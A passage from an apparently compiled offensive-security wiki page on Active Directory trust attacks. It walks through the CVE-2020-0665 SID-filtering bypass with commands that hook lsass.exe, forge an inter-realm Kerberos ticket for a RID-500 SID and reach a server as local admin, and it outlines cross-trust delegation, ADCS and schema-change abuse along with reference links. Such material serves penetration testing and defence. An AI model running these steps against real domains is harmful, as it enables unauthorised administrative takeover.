rel="noreferrer"><em>https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research</em></a></p><h4 id="cve-2020-0665" tabindex="-1">CVE-2020-0665 <a class="header-anchor" href="#cve-2020-0665" aria-label="Permalink to &quot;CVE-2020-0665&quot;">​</a></h4><p>The idea behind <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0665" target="_blank" rel="noreferrer">CVE-2020-0665</a> is to bypass SID filtering to authenticate as a server in the trusting forest targeting the local admin on this server (RID = 500). To do so, the local domain SID of the server is spoofed to &quot;fake&quot; a child domain in the trusted forest, which will be added to the list of trusted SIDs in the trusting forest domain&#39;s TDO (<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4" target="_blank" rel="noreferrer">Trusted Domain Object</a>) after 24 hours (see <a href="./index#sid-filtering">SID filtering</a>). An inter-realm/referral ticket will then be forged using the spoofed SID as extended SID which will be used to request a service ticket to that server (see <a href="./index#forging-tickets">Forging tickets</a>).</p><p>The attack is conducted as follows:</p><ol><li>Get the local domain&#39;s SID of the target server. This step requires Windows older than Windows 10 build 1607, or before Server 2016, as it uses MS-LSAT RPC to query the target server for the SID of its local domain, that is restricted on newer versions and requires administrative privileges on the target.</li><li>Spoof the local domain&#39;s SID of the target server. This steps must be run as <code>SYSTEM</code> on the trusted forest&#39;s domain controller. The Frida script used for this step is made for Windows Server 2016 version 1607. If the target runs a different version, the address offset might be different and some additional preparation must be done.</li><li>Forging tickets. For this step, refer to <a href="./index#kerberos-authentication">Kerberos authentication</a> theory chapter for more details about the trust key being used, the ticket forgery is then highly similar to the <a href="./index#forging-tickets">Forging ticket</a> practice part.</li></ol><div class="tip custom-block"><p>For more details about how this attack works under the hood, refer to the article on <a href="https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/" target="_blank" rel="noreferrer">dirkjanm.io</a> by <a href="https://twitter.com/_dirkjan" target="_blank" rel="noreferrer">Dirk-jan Mollema</a>.</p></div><div class="warning custom-block"><p>Some considerations to reproduce the attack:</p><ul><li>Full control over the trusted forest is assumed.</li><li>Information that flows over to the trusting forest can be modified.</li><li>There is at least one server joined to a domain in the trusting forest (referred to as the &quot;target server&quot; here).</li></ul></div><p>The attack can be conducted with <a href="https://twitter.com/_dirkjan" target="_blank" rel="noreferrer">Dirk-jan Mollema</a>&#39;s <a href="https://github.com/dirkjanm/forest-trust-tools" target="_blank" rel="noreferrer">forest trust tools</a>.</p><h5 id="_1-get-local-domain-sid" tabindex="-1">1. Get Local Domain SID <a class="header-anchor" href="#_1-get-local-domain-sid" aria-label="Permalink to &quot;1. Get Local Domain SID&quot;">​</a></h5><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Obtain the local domain&#39;s SID of the target server in the trusting forest</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># The hostname (Security Principal Name) of the target server is required</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">getlocalsid.py</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;trusted_domain&quot;/&quot;someusername&quot;@&quot;&lt;target_server_FQDN or IP address&gt;&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;target_server_NETBIOS_name&quot;</span></span></code></pre></div><h5 id="_2-spoof-the-target-sid" tabindex="-1">2. Spoof the target SID <a class="header-anchor" href="#_2-spoof-the-target-sid" aria-label="Permalink to &quot;2. Spoof the target SID&quot;">​</a></h5><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Become a &quot;domain&quot; in the trusted forest using the spoofed SID so that this one is added to the authorized SIDs in the trusting domain</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Intercept the Netlogon request for an existing child domain in the trusted forset and modify the SID with the spoofed one by hooking lsass.exe when the NetrGetForestTrustInformation RPC call is made</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Notice that the SID of the child domain to look for and the local domain&#39;s SID of the target server should be modified with the right values</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># This is to be run as SYSTEM on the trusted DC</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> .</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">rida_intercept.py</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lsass.exe</span></span></code></pre></div><h5 id="_3-get-local-admin-on-the-target" tabindex="-1">3. Get local admin on the target <a class="header-anchor" href="#_3-get-local-admin-on-the-target" aria-label="Permalink to &quot;3. Get local admin on the target&quot;">​</a></h5><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1. Forge an inter-realm/referral ticket with the spoofed SID put as extended SID with RID 500 using the AES key of the incoming trust</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ticketer.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -aesKey</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;AES_key_of_incoming_trust&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -domain</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;trusted_root_domain_FQDN&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -domain-sid</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;trusted_root_domain_SID&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -user-id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1000</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -groups</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 513</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -extra-sid</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&lt;spoofed_SID&gt;&quot;-500</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -spn</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;krbtgt/trusting_root_domain_FQDN&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;someusername&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2. Request a service ticket using the forged referral ticket</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Notice that keys has to be manually modified in the getftST.py script before</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">KRB5CCNAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;someusername.ccache&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> getftST.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -spn</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;CIFS/target_server_FQDN&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -target-domain</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;trusting_root_domain_FQDN&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -via-domain</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;trusted_root_domain_FQDN&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;domain/username&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -dc-ip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;target_DC_IP&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3. Use the obtained ST to access the target server as local admin</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">KRB5CCNAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">username.ccache</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> smbclient.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -k</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;trusted_domain&quot;/&quot;someusername&quot;@&quot;target_server_FQDN&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -no-pass</span></span></code></pre></div><h4 id="🛠️-keys-container-trust" tabindex="-1">🛠️ Keys container trust <a class="header-anchor" href="#🛠️-keys-container-trust" aria-label="Permalink to &quot;🛠️ Keys container trust&quot;">​</a></h4><p>// <a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research</a></p><p>// Enterprise Domain Controllers have <code>GenericAll</code> on <code>Keys</code> container (<code>CN=keys,DN=domain,DN=local</code>), &quot;Default container for key credential objects&quot;, used for gMSA ?</p><p>// Container should be empty, but if it&#39;s not, exploitable seulement s&#39;il y a déjà des objets dans le conteneur ce qui n&#39;est pas censé être le cas par défaut.</p><h4 id="🛠️-dns-trust" tabindex="-1">🛠️ DNS trust <a class="header-anchor" href="#🛠️-dns-trust" aria-label="Permalink to &quot;🛠️ DNS trust&quot;">​</a></h4><p>// <a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research</a></p><h4 id="🛠️-gpo-on-site" tabindex="-1">🛠️ GPO on site <a class="header-anchor" href="#🛠️-gpo-on-site" aria-label="Permalink to &quot;🛠️ GPO on site&quot;">​</a></h4><p>// <a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research</a></p><h4 id="🛠️-goldengmsa" tabindex="-1">🛠️ GoldenGMSA <a class="header-anchor" href="#🛠️-goldengmsa" aria-label="Permalink to &quot;🛠️ GoldenGMSA&quot;">​</a></h4><p>// <a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent</a></p><h4 id="🛠️-schema-change-attack-source" tabindex="-1">🛠️ Schema change attack (<a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent" target="_blank" rel="noreferrer">source</a>) <a class="header-anchor" href="#🛠️-schema-change-attack-source" aria-label="Permalink to &quot;🛠️ Schema change attack ([source](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent))&quot;">​</a></h4><p>Depuis le domaine source, en tant que SYSTEM, on peut modifier le schéma dans la partition de Configuration puis attendre que ce soit répliqué sur le domaine cible</p><p>Plus particulièrement en modifiant le defaultSecurityDescriptor de classes intéressantes (groupes, users, GPC), ou retirant le flag confidential</p><h3 id="🛠️-abusing-permissions" tabindex="-1">🛠️ Abusing permissions <a class="header-anchor" href="#🛠️-abusing-permissions" aria-label="Permalink to &quot;🛠️ Abusing permissions&quot;">​</a></h3><h4 id="unconstrained-delegation-abuse" tabindex="-1">Unconstrained delegation abuse <a class="header-anchor" href="#unconstrained-delegation-abuse" aria-label="Permalink to &quot;Unconstrained delegation abuse&quot;">​</a></h4><p>In order to abuse unconstrained delegation across trusts, <a href="./index#tgt-delegation">TGT delegation</a> must be allowed/enabled on the trust, and <a href="./index#authentication-level">Selective Authentication</a> must NOT be enabled (or with a configuration that would allow for the exploitation detailed below, see the <a href="./index#authentication-level">Authentication level</a> chapter).</p><p>In addition to that, the ideal setup would be to have a two-way trust between the compromised domain (A) and the target domain (B), in order to allow the exploitation detailed below.</p><ol><li>(trusting B -&gt; trusted A), allows access from A to B, allows to coerce authentications</li><li>(trusting A -&gt; trusted B), allows access from B to A, allows the coerced account to authenticate to the attacker-controlled KUD account.</li></ol><p>Other regular KUD-abuse-specific requirements apply (e.g. accounts not sensitive for delegation or member of the protected users group), see the <a href="./../kerberos/delegations/unconstrained">Kerberos Unconstrained Delegation</a> page.</p><p>If an attacker manages to gain control over an account configured for unconstrained delegation, he could escalate to domain admin privileges. Across trusts, the scenario is very similar. An attacker needs to gain control over a trusted account, configured for KUD (Kerberos Unconstrained Delegation), in order to act on a trusting resource (e.g. trusting domain&#39;s DC) as another principal (i.e. domain admin).</p><div class="tip custom-block"><p>By default, all domain controllers are configured for unconstrained delegation.</p></div><p>The <a href="./../kerberos/delegations/unconstrained#practice">Kerberos Unconstrained Delegation</a> page can be consulted in order to obtain operational guidance on how to abuse this context.</p><p>In most cases, the attacker will have to:</p><ol><li>coerce the authentication (<a href="./../print-spooler-service/printerbug">PrinterBug</a>, <a href="./../mitm-and-coerced-authentications/ms-efsr">PetitPotam</a>, <a href="./../mitm-and-coerced-authentications/ms-fsrvp">ShadowCoerce</a>, <a href="./../mitm-and-coerced-authentications/ms-dfsnm">DFSCoerce</a>, etc.) of a high-value target (e.g. domain controller) of the trusting domain</li><li>retrieve the TGT delegated in the service ticket the trusting resource used to access the attacker-controlled KUD account</li><li>authenticate to trusting resources using the extracted TGT (<a href="./../kerberos/ptt">Pass the Ticket</a>) in order to conduct privileged actions (e.g. <a href="./../credentials/dumping/dcsync">DCSync</a>)</li></ol><div class="tip custom-block"><p>Read the <a href="./../kerberos/delegations/unconstrained">Unconstrained</a> article for more insight</p></div><h4 id="🛠️-dacl-abuse" tabindex="-1">🛠️ DACL abuse <a class="header-anchor" href="#🛠️-dacl-abuse" aria-label="Permalink to &quot;🛠️ DACL abuse&quot;">​</a></h4><p>TODO // How a domain admin of forest A could administrate a domain in forest B ? <a href="https://social.technet.microsoft.com/Forums/windowsserver/en-US/fa4070bd-b09f-4ad2-b628-2624030c0116/forest-trust-domain-admins-to-manage-both-domains?forum=winserverDS" target="_blank" rel="noreferrer">https://social.technet.microsoft.com/Forums/windowsserver/en-US/fa4070bd-b09f-4ad2-b628-2624030c0116/forest-trust-domain-admins-to-manage-both-domains?forum=winserverDS</a></p><p>TODO // Regular permissions, ACE, and whatnot abuses, but now between foreign principals, BloodHound comes in handy.</p><h4 id="🛠️-adcs-abuse" tabindex="-1">🛠️ ADCS abuse <a class="header-anchor" href="#🛠️-adcs-abuse" aria-label="Permalink to &quot;🛠️ ADCS abuse&quot;">​</a></h4><p>When an ADCS is installed and configured in an Active Directory environment, a CA is available for the whole forest. Every usual ADCS attack can be executed through intra-forest trusts. <a href="https://www.thehacker.recipes/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8" target="_blank" rel="noreferrer">ESC8</a> and <a href="https://www.thehacker.recipes/ad/movement/ad-cs/unsigned-endpoints#rpc-endpoint-esc11" target="_blank" rel="noreferrer">ESC11</a> in particular can be used to pivot to any domain within the forest associated to the C</p><h4 id="🛠️-group-memberships" tabindex="-1">🛠️ Group memberships <a class="header-anchor" href="#🛠️-group-memberships" aria-label="Permalink to &quot;🛠️ Group memberships&quot;">​</a></h4><p>// group scoping, <a href="https://posts.specterops.io/a-pentesters-guide-to-group-scoping-c7bbbd9c7560" target="_blank" rel="noreferrer">https://posts.specterops.io/a-pentesters-guide-to-group-scoping-c7bbbd9c7560</a></p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><h3 id="general" tabindex="-1">General <a class="header-anchor" href="#general" aria-label="Permalink to &quot;General&quot;">​</a></h3><p><a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-1-the-mechanics/" target="_blank" rel="noreferrer">https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-1-the-mechanics/</a></p><p><a href="https://syfuhs.net/windows-and-domain-trusts" target="_blank" rel="noreferrer">https://syfuhs.net/windows-and-domain-trusts</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)?redirectedfrom=MSDN" target="_blank" rel="noreferrer">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)?redirectedfrom=MSDN</a></p><p><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc736874(v=ws.10)" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc736874(v=ws.10)</a></p><p><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10)#ntlm-referral-processing" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10)#ntlm-referral-processing</a></p><p><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)?redirectedfrom=MSDN" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)?redirectedfrom=MSDN</a></p><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/bac4dc69-352d-416c-a9f4-730b81ababb3" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/bac4dc69-352d-416c-a9f4-730b81ababb3</a></p><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/f47e40e1-b9ca-47e2-b139-15a1e96b0e72" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/f47e40e1-b9ca-47e2-b139-15a1e96b0e72</a></p><p><a href="https://blogs.msmvps.com/acefekay/tag/active-directory-trusts/" target="_blank" rel="noreferrer">https://blogs.msmvps.com/acefekay/tag/active-directory-trusts/</a></p><p><a href="https://improsec.com/tech-blog/o83i79jgzk65bbwn1fwib1ela0rl2d" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/o83i79jgzk65bbwn1fwib1ela0rl2d</a></p><p><a href="https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Slides-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf" target="_blank" rel="noreferrer">https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Slides-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf</a></p><p><a href="https://secureidentity.se/msds-shadowprincipal/" target="_blank" rel="noreferrer">https://secureidentity.se/msds-shadowprincipal/</a></p><p><a href="https://learn.microsoft.com/en-us/microsoft-identity-manager/pam/privileged-identity-management-for-active-directory-domain-services" target="_blank" rel="noreferrer">https://learn.microsoft.com/en-us/microsoft-identity-manager/pam/privileged-identity-management-for-active-directory-domain-services</a></p><h3 id="offensive-pov" tabindex="-1">Offensive POV <a class="header-anchor" href="#offensive-pov" aria-label="Permalink to &quot;Offensive POV&quot;">​</a></h3><p><a href="https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/" target="_blank" rel="noreferrer">https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/</a></p><p><a href="https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/" target="_blank" rel="noreferrer">https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/</a></p><p><a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" target="_blank" rel="noreferrer">https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/</a></p><p><a href="https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/" target="_blank" rel="noreferrer">https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/</a></p><p><a href="https://mayfly277.github.io/posts/GOADv2-pwning-part12" target="_blank" rel="noreferrer">https://mayfly277.github.io/posts/GOADv2-pwning-part12</a></p><p><a href="https://adsecurity.org/?p=282" target="_blank" rel="noreferrer">https://adsecurity.org/?p=282</a></p><p><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noreferrer">https://adsecurity.org/?p=1640</a></p><p><a href="https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/" target="_blank" rel="noreferrer">https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/</a></p><p><a href="https://blog.harmj0y.net/redteaming/the-trustpocalypse/" target="_blank" rel="noreferrer">https://blog.harmj0y.net/redteaming/the-trustpocalypse/</a></p><p><a href="https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/" target="_blank" rel="noreferrer">https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></p><p><a href="https://adsecurity.org/?p=4056" target="_blank" rel="noreferrer">https://adsecurity.org/?p=4056</a></p><p><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1" target="_blank" rel="noreferrer">https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1</a></p><p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-2-known-ad-attacks-from-child-to-parent" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-2-known-ad-attacks-from-child-to-parent</a></p><p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained</a></p><p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research</a></p><p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent</a></p><p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent</a></p><p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted" target="_blank" rel="noreferrer">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted</a></p><p><a href="https://nored0x.github.io/red-teaming/active-directory-Trust-enumeration/" target="_blank" rel="noreferrer">https://nored0x.github.io/red-teaming/active-directory-Trust-enumeration/</a></p><p><a href="https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d" target="_blank" rel="noreferrer">https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d</a></p><p><a href="https://adsecurity.org/?p=425" target="_blank" rel="noreferrer">https://adsecurity.org/?p=425</a></p><p><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1" target="_blank" rel="noreferrer">https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1</a></p><p><a href="https://www.labofapenetrationtester.com/2019/04/abusing-PAM.html" target="_blank" rel="noreferrer">https://www.labofapenetrationtester.com/2019/04/abusing-PAM.html</a></p>`,87))])}const T=h(f,[["render",g]]);export{D as __pageData,T as default};
